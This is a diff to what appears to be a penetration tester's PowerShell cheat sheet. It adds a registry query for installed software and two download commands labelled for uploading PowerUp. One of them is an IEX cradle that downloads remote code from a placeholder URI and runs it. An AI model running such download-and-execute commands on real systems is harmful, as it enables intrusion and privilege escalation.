@@ -6,7 +6,13 @@
 
 ### Commands
 
+Gets installed software, version, and install date.
 ```PowerShell
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
 ```
-Gets installed software, version, and install date.
+
+Web requests (if one doesnt work, try the other). Upload PowerUp!
+```PowerShell
+Invoke-WebRequest -Uri <target uri> -Method Get -Outfile <whatevs>.ps1 #IWR
+powershell IEX(New-Object Net.Webclient).downloadString("<target uri>") #Invoke-Expression
+```
